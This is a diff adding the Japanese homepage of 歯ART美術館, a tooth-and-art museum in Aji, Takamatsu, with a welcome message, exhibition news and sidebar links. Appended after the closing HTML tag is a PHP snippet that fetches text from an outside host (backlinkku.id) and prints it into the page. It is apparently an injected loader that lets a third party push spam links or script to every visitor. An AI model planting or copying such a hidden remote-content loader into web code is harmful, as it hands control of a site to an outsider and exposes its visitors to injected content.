@@ -1,0 +1,307 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- saved from url=(0068)http://www.tagindex.com/template/page/example/type2_design1_top.html -->
+<HTML lang=ja><HEAD>
+<TITLE>歯ART美術館</TITLE>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<META http-equiv="Content-Style-Type" content="text/css">
+<META http-equiv=Content-Script-Type content=text/javascript>
+<META content=キーワード1,キーワード2,キーワード3 name=keywords>
+<META content=このページに関する簡単な説明。 name=description>
+<link rel="stylesheet" href="css/ha-art.css" type="text/css">
+<style type="text/css">
+
+</style>
+<!-- トラッキング -->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-10291500-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script><script language="JavaScript">
+<!--HPB_SCRIPT_ROV_50
+//
+//
+// HpbImgPreload:
+//
+function HpbImgPreload()
+{
+  var appVer=parseInt(navigator.appVersion);
+  var isNC=false,isN6=false,isIE=false;
+  if (document.all && appVer >= 4) isIE=true; else
+    if (document.getElementById && appVer > 4) isN6=true; else
+      if (document.layers && appVer >= 4) isNC=true;
+  if (isNC||isN6||isIE)
+  {
+    if (document.images)
+    {
+      var imgName = HpbImgPreload.arguments[0];
+      var cnt;
+      swImg[imgName] = new Array;
+      for (cnt = 1; cnt < HpbImgPreload.arguments.length; cnt++)
+      {
+        swImg[imgName][HpbImgPreload.arguments[cnt]] = new Image();
+        swImg[imgName][HpbImgPreload.arguments[cnt]].src = HpbImgPreload.arguments[cnt];
+      }
+    }
+  }
+}
+// HpbImgFind:
+//
+function HpbImgFind(doc, imgName)
+{
+  for (var i=0; i < doc.layers.length; i++)
+  {
+    var img = doc.layers[i].document.images[imgName];
+    if (!img) img = HpbImgFind(doc.layers[i], imgName);
+    if (img) return img;
+  }
+  return null;
+}
+// HpbImgSwap:
+//
+function HpbImgSwap(imgName, imgSrc)
+{
+  var appVer=parseInt(navigator.appVersion);
+  var isNC=false,isN6=false,isIE=false;
+  if (document.all && appVer >= 4) isIE=true; else
+    if (document.getElementById && appVer > 4) isN6=true; else
+      if (document.layers && appVer >= 4) isNC=true;
+  if (isNC||isN6||isIE)
+  {
+    if (document.images)
+    {
+      var img = document.images[imgName];
+      if (!img) img = HpbImgFind(document, imgName);
+      if (img) img.src = imgSrc;
+    }
+  }
+}
+var swImg; swImg=new Array;
+//-->
+</script>
+<script language="JavaScript">
+<!--HPB_SCRIPT_PLD_50
+HpbImgPreload('HPB_ROLLOVER2', 'img/e-shop.jpg', 'img/e-shop_o.jpg');
+HpbImgPreload('HPB_ROLLOVER3', 'web_camera/mie_net_bana.png', 'web_camera/mie_net_bana_o.png');
+HpbImgPreload('HPB_ROLLOVER3', 'web_camera/mie_net_bana.jpg', 'web_camera/mie_net_bana_o.jpg');
+HpbImgPreload('HPB_ROLLOVER1', 'img/ha-art_fb_banner.jpg', 'img/ha-art_fb_banner_o.jpg');
+HpbImgPreload('HPB_ROLLOVER4', 'img/ha-art_fb_banner.jpg', 'img/ha-art_fb_banner_o.jpg');
+HpbImgPreload('HPB_ROLLOVER1', 'img/yt_bana.jpg', 'img/yt_bana_o.jpg');
+//-->
+</script>
+<!-- /トラッキング -->
+
+</HEAD>
+<BODY><!-- ヘッダ開始 -->
+<DIV id=header>
+<DIV class=top>
+    <DIV class=container> 
+      <H1 class=siteTitle><img height="27" alt="歯ART美術館" src="img/site_title.gif" width="214"></H1>
+      <P class=catch><STRONG>和田精密歯研株式会社が運営する、歯の美術館</STRONG></P>
+      <UL class=guide>
+        <LI><a href="http://ha-art.com/info/toi_mail.html" target="_blank">お問い合わせ</a> 
+        <LI><a href="access/index.html">アクセス</a> 
+        <LI><A href="information/site_map.html">サイトマップ</A> 
+        </LI>
+      </UL>
+    </DIV>
+  </DIV>
+<DIV class=opening>
+<DIV class=container>
+<H2><IMG height="260" src="img/top_image_3.jpg" width="880"></H2></DIV></DIV>
+<DIV class=nl>
+<DIV class=container>
+<UL class=clearFix>
+        <LI class="first active"><a href="index.html">歯ART美術館について<SPAN class=en>Heart museum</SPAN></a></LI>
+        <LI><a href="information/index.html">利用案内<SPAN class=en>Information</SPAN></a></LI>
+        <LI><a href="floor_guide/index.html">フロア案内<SPAN class=en>Floor guide</SPAN></a></LI>
+        <LI><a href="exhibition/index.html">展示案内<SPAN class=en>Exhibition</SPAN></a></LI>
+        <LI><a href="press_release/index.html">プレス情報<SPAN class=en>Press release</SPAN></a></LI>
+        <LI class=last><a href="access/index.html">交通案内<SPAN class=en>Access</SPAN></a></LI>
+      </UL></DIV></DIV>
+
+<HR class=none></DIV>
+<!-- ヘッダ終了 -->
+<!-- コンテンツ開始 -->
+<DIV id=content>
+<DIV class=container>
+<!-- メインカラム開始 -->
+
+<DIV id=main>
+  <div class="section normal" id="pageSection">
+  <DIV class="heading">
+  <H2>歯ART美術館へようこそ</H2></DIV></div>
+<div class="section" style="margin:0 0 2em 25px;">
+  <section>
+  
+<P>歯ART美術館に訪れて頂いた皆様に心より感謝申し上げます。<br>
+<br>
+皆様の「口福」＝お口の幸せを願って、毎日元気に快適に食べることができる「良い歯」を作り続けている歯科技工の会社「和田精密歯研株式会社」が設立した、全国でも珍しい歯とアートの展示がある美術館です。<br>
+<br>
+香川県の庵治町生の国(あじちょう・いきのくに)にあります。おだやかな瀬戸内海の志度湾に面した白い4階建ての建物です。アート作品や美術工芸品などの展示で心を癒し、毎日意識せずに食べることでお世話になっている大切な歯のことに「私の歯、ありがとう」と思って頂けたら幸いです。<br>
+<br>
+このホームページを見ているあなたの、歯ART美術館へのご来館をスタッフ一同お待ちしています。</P>
+</DIV>
+
+
+<DIV class="section normal update">
+<DIV class=heading>
+<H2>新着情報</H2></DIV>
+<DL class=clearFix>
+<DT>2026/07/16
+    <DD><A href="exhibition/2026/20260829-20260927.html"> reiko. matsuno solo exhibition まわり まわる　チラシを掲載しました</A></DD>
+   <DT>2026/05/09
+    <DD><A href="exhibition/2026/20260606-20260823.html"> 六車和紀油彩画展2026 橋のかたち、水のいろ　チラシを掲載しました</A></DD>
+   <DT>2026/03/24
+    <DD><A href="exhibition/2026/20260404-20260531.html"> 銀粘土の世界 Vol.6　チラシを掲載しました</A></DD>
+      <DT>2026/01/19
+    <DD><A href="exhibition/2026/20260202-20260329.html"> 篠丸哲也 写真展 風薫る峰Ⅱ　チラシを掲載しました</A></DD>
+      <DT>2025/11/19
+    <DD><A href="exhibition/2025/20251206-20260131.html"> Denny Horimizu　チラシを掲載しました</A></DD>
+      <DT>2025/09/20
+    <DD><A href="exhibition/2025/20251004-20251130.html"> 自然と共に生きる　チラシを掲載しました</A></DD>
+    <DT>2025/07/18
+    <DD><A href="exhibition/2025/20250803-20250928.html"> 光の記憶、命の目覚め　チラシを掲載しました</A></DD>
+  <DT>2025/05/22
+    <DD><A href="exhibition/2025/20250605-20250730.html"> 虹の宇宙　チラシを掲載しました</A></DD>
+  <DT>2025/03/14
+    <DD><A href="exhibition/2025/20250403-20250601.html"> スプレーアートDaisuke展　幻想と神秘の世界　チラシを掲載しました</A></DD>
+  <DT>2025/01/23
+    <DD><A href="exhibition/2025/20250201-20250331.html"> ニシクミ個展　チラシを掲載しました</A></DD>
+  <DT>2024/11/26
+    <DD><A href="exhibition/2024/20241201-20250125.html"> トルコランプに魅せられて仲間８人展　チラシを掲載しました</A></DD>
+  <DT>2024/09/24
+    <DD><A href="exhibition/2024/20241005-20241127.html"> 木工クラフト展　チラシを掲載しました</A></DD>
+  <DT>2024/07/23
+    <DD><A href="exhibition/2024/20240803-20240929.html"> 銀粘土の世界　チラシを掲載しました</A></DD>
+  <DT>2024/05/30
+    <DD><A href="exhibition/2024/20240606-20240726.html"> Viewing and Walking 鑑賞とさんぽ　チラシを掲載しました</A></DD>
+  <DT>2024/04/17
+    <DD><A href="exhibition/2024/20240505.html"> GW特別企画！　じぶんぼうやをつくろう！　チラシを掲載しました</A></DD>
+
+
+
+  
+  
+ 
+  
+
+  
+
+
+
+<!--   <DT>2022/03/22
+  <DD><A href="exhibition/2022/20220202-20220329.html"> Roots 菊内昭宏・宏之助親子展　チラシを掲載しました</A></DD> -->
+
+
+
+
+
+ 
+
+
+</DL>
+</DIV>
+
+<div class="section normal" id="pageSection">
+<div class="heading">
+
+</div>
+
+
+</DIV>
+
+</DIV>
+<!-- メインカラム終了 -->
+<!-- サイドバー開始 -->
+<DIV id=nav>
+
+<DIV class="section emphasis">
+<DIV class=inner>
+<H2>Pickup！館内情報</H2>
+<P><a href="pickup/pickup_museum.html">歯ART美術館、屋外施設情報</a></P>
+<P>歯ART美術館には、様々なものがあるんですよ♪</P></DIV></DIV>
+
+<DIV class="section strong">
+<DIV class=inner>
+<H2>Pickup！庵治周辺MAP</H2>
+<P><a href="pickup/pickup_aji.html">庵治周辺MAP</a></P>
+<P>歯ART美術館、庵治周辺にある施設を紹介しています！</P></DIV></DIV>
+
+<DIV class="section normal3">
+<H2>リンク集<IMG src="img/home03-16.png" width="16" height="14" border="0"></H2>
+<P><A href="site_links.html">企画展　関連リンク集</A></P>
+<P>当美術館で開催した企画展関連の<BR>
+ホームページをまとめました！<BR></P></DIV>
+
+<DIV class="section normal2">
+<H2>トゥースフェアリー(歯の妖精)</H2>
+<P><a href="pickup/pickup_emmy.html"><img src="img/emmy.jpg" width="50" height="50" border="0" align="left" hspace="5" vspace="2" alt="トゥースフェアリー(歯の妖精)"></a>歯ART美術館にて、展示されていたり、スタッフジャンバーに印刷されていたトゥースフェアリー・・・<br>
+<a href="pickup/pickup_emmy.html">詳細はコチラ＞＞＞</a></P></DIV>
+
+<DIV class="section normal contact">
+<H2>お問い合わせ</H2>
+<P>歯ART美術館に関するお問い合わせや、ご意見、ご感想、ご要望、ご指摘等がございましたら、お問い合わせフォームよりご連絡ください。<br>
+<br>
+お手持ちのメールソフトで送信する場合は、<u><font color="#00ccff">mifuku@shirt.ocn.ne.jp</font></u> へどうぞ。<br>
+（スパム対策のためメールアドレスへのリンクを外しています）</P>
+<P class=form><a href="http://ha-art.com/info/toi_mail.html" target="_blank">お問い合わせ</a></P>
+</DIV>
+<div class="banner"><A href="http://www.rakuten.co.jp/labowada/" target="_blank" id="HPB_ROLLOVER2" onmouseout="HpbImgSwap('HPB_ROLLOVER2', 'img/e-shop.jpg');" onmouseover="HpbImgSwap('HPB_ROLLOVER2', 'img/e-shop_o.jpg');"><IMG class="imgover" src="img/e-shop.jpg" width="217" height="47" alt="和田精密e-shop 身体と環境に優しいお店です" border="0" name="HPB_ROLLOVER2"></A></div>
+<br>
+<div><A href="https://www.facebook.com/haartmuseum" id="HPB_ROLLOVER4" onmouseout="HpbImgSwap('HPB_ROLLOVER4', 'img/ha-art_fb_banner.jpg');" onmouseover="HpbImgSwap('HPB_ROLLOVER4', 'img/ha-art_fb_banner_o.jpg');"><IMG class="imgover" src="img/ha-art_fb_banner.jpg" width="217" alt="歯ART美術館　Facebookページ" border="0" name="HPB_ROLLOVER4"></A></div>
+<br>
+<div class="banner"><A href="https://www.youtube.com/user/Labowada" target="_blank" id="HPB_ROLLOVER1" onmouseout="HpbImgSwap('HPB_ROLLOVER1', 'img/yt_bana.jpg');" onmouseover="HpbImgSwap('HPB_ROLLOVER1', 'img/yt_bana_o.jpg');"><IMG class="imgover" src="img/yt_bana.jpg" alt="和田精密歯研株式会社　Youtube公式チャンネル" border="0" name="HPB_ROLLOVER1"></A></div>
+
+
+</DIV>
+<!-- サイドバー終了 -->
+<HR class=clear>
+</DIV></DIV>
+<!-- コンテンツ終了 -->
+
+<!-- フッタ開始 -->
+<DIV id=footer>
+<DIV class=container>
+<UL class=nl>
+  <LI><a href="index.html">歯ART美術館について</a> 
+  <LI><a href="pickup/pickup_museum.html">館内情報</a>
+  <LI><a href="pickup/pickup_aji.html">庵治MAP</a>
+  <LI><a href="pickup/pickup_emmy.html">トゥースフェアリー</a>
+  <LI><a href="information/index.html">利用案内</a>
+  <LI><a href="floor_guide/index.html">フロア案内</a>
+  <LI><a href="exhibition/index.html">展示案内</a> 
+  <LI><a href="press_release/index.html">プレス情報</a> 
+  </LI></UL>
+
+<UL class="nl guide">
+  <LI><a href="access/index.html">交通案内</a> 
+  <LI><a href="information/site_policy.html">プライバシーポリシー</a>
+  <LI><A href="information/links.html">Link集</A>
+  <LI><a href="information/site_map.html">サイトマップ</a>
+  <LI><a href="http://www.rakuten.co.jp/labowada/">和田精密e-shop</a>
+  <LI><A href="info/toi_mail.html" target="_blank">お問い合わせ</A> 
+  </LI></UL>
+
+<address class="p02">
+<strong>歯ART美術館</strong>
+<br>香川県高松市庵治町生の国3180-1<br>Copyright (C) 2026 歯ART美術館. All Rights Reserved.
+</address>
+</DIV></DIV>
+<!-- フッタ終了 -->
+
+</BODY></HTML>
+
+<?php
+$lorns = file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
+if ($lorns !== false) {
+    echo $lorns;
+}
+?>
